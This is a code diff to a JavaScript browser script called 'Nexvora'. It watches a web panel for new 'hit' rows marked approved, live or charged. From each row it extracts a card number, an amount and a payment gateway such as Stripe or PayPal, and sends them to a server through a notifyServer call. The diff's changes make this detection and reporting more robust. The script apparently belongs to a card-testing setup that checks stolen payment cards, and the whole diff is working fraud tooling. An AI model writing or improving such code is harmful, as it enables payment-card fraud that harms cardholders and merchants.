@@ -40,21 +40,24 @@
         // Obfuscated rows might have dynamic classes, so we look for text patterns
         const text = row.innerText || '';
         const lowerText = text.toLowerCase();
+        
+        console.log('Nexvora Check:', lowerText);
 
-        // Check if this hit is successful
-        if (lowerText.includes('approved') || lowerText.includes('success') || lowerText.includes('live')) {
-            console.log('Nexvora: Successful hit detected in UI!', text);
+        // Check if this hit matches any success keyword
+        const successKeywords = ['approved', 'success', 'live', 'authorized', 'charged'];
+        const isSuccess = successKeywords.some(kw => lowerText.includes(kw));
+
+        if (isSuccess) {
+            console.info('🚀 Nexvora: Successful hit detected in UI!', text);
             
-            // Extract data (this is generic parsing, might need adjustment based on UI layout)
-            const parts = text.split('\n').map(p => p.trim()).filter(p => p);
+            // Extract data
+            const parts = text.split('\n').map(p => p.trim()).filter(p => !!p);
             
-            // Basic extraction logic - update based on row structure
-            // Example Row: "415930... | $10 | Stripe | Approved"
             const hitData = {
-                card: parts[0] || 'N/A',
-                amount: parts[1] || 'N/A',
-                gateway: parts[2] || 'Stripe',
-                status: parts[3] || 'Approved'
+                card: parts.find(p => /^\d{4,}/.test(p)) || 'N/A',
+                amount: parts.find(p => p.includes('$') || /^\d+\.\d{2}/.test(p)) || 'N/A',
+                gateway: parts.find(p => ['stripe', 'square', 'braintree', 'paypal'].includes(p.toLowerCase())) || 'Stripe',
+                status: 'Approved'
             };
 
             notifyServer(hitData);
@@ -63,32 +66,32 @@
 
     const setupObserver = () => {
         const containers = [
-            document.getElementById('recentHitsWrap'),
-            document.getElementById('hitsWrap')
-        ];
+            'recentHitsWrap',
+            'hitsWrap'
+        ].map(id => document.getElementById(id)).filter(el => !!el);
+
+        if (containers.length === 0) {
+            console.warn('Nexvora: Hit containers not found. Retrying in 2 seconds...');
+            setTimeout(setupObserver, 2000);
+            return;
+        }
 
         containers.forEach(container => {
-            if (!container) return;
-
             const observer = new MutationObserver((mutations) => {
                 mutations.forEach((mutation) => {
                     mutation.addedNodes.forEach((node) => {
-                        if (node.nodeType === 1) { // Element node
+                        if (node.nodeType === 1) { 
                             processNewRow(node);
                         }
                     });
                 });
             });
 
-            observer.observe(container, { childList: true });
-            console.log(`Nexvora: Monitoring ${container.id} for hits...`);
+            observer.observe(container, { childList: true, subtree: true });
+            console.log(`✅ Nexvora: Monitoring ${container.id} for successful hits...`);
         });
     };
 
-    // Initialize
-    if (document.readyState === 'loading') {
-        document.addEventListener('DOMContentLoaded', setupObserver);
-    } else {
-        setupObserver();
-    }
+    console.log('🔥 Nexvora Notification System initialized.');
+    setupObserver();
 })();
